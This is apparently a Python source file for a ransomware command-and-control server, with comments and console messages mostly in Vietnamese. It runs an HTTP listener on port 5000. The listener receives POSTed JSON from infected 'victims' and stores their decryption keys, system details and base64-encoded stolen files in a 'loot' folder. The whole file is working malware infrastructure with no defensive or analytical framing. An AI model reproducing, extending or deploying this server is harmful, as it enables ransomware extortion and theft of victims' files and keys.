from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import base64

class RansomHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        print(f"\n[!] Victim connected: {self.client_address[0]}")
        
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
           
            data = json.loads(post_data)
        except Exception as e:
            print(f" !] Lỗi giải mã JSON: {e}")
            self.send_response(400)
            self.end_headers()
            return

        # set up loot
        loot_dir = os.path.join(os.getcwd(), "loot")
        if not os.path.exists(loot_dir):
            os.makedirs(loot_dir)
        
        if 'key' in data:
            with open(os.path.join(loot_dir, "decrypt.key"), "w") as f:
                f.write(data['key'])
            print(f" [+] Đã lưu Key giải mã: {data['key']}")

       
        if 'system' in data:
            with open(os.path.join(loot_dir, "victim_info.txt"), "w", encoding="utf-8") as f:
                f.write(str(data['system']))
            print(f" [+] Đã lưu thông tin máy nạn nhân.")

        # Lấy nội dung file (EXE, PDF, TXT...)
        if 'content' in data:
            file_dict = data['content'] 
            for filename, b64_content in file_dict.items():
                try:
                    safe_name = os.path.basename(filename)
                    
                    file_bytes = base64.b64decode(b64_content)
                    
                    with open(os.path.join(loot_dir, safe_name), "wb") as f:
                        f.write(file_bytes)
                    print(f" [+] Đã thu thập và khôi phục file: {safe_name}")
                except Exception as e:
                    print(f" [!] Lỗi khi xử lý file {filename}: {e}")

        # Pháº£n há»“i cho victim
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        self.send_response(403)
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 5000), RansomHandler)
    print("------------------------------------------")
    print("C&C Server JSON Mode đang chạy tại Port 5000...")
    print("------------------------------------------")
    server.serve_forever()